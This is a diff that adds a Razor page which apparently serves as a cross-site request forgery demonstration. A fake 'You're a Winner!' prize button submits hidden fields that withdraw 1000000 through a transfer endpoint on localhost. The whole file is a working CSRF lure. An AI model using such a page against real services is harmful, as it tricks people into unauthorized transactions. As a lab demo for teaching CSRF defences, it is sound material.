@@ -1,0 +1,11 @@
+﻿@page
+@model IndexModel
+@{
+    ViewData["Title"] = "Home page";
+}
+<h1>Congratulations! You're a Winner!</h1>
+<form action="https://localhost:5001/transfer" method="post">
+    <input type="hidden" name="Transaction" value="withdraw" />
+    <input type="hidden" name="Amount" value="1000000" />
+    <input type="submit" value="Click to collect your prize!" />
+</form>
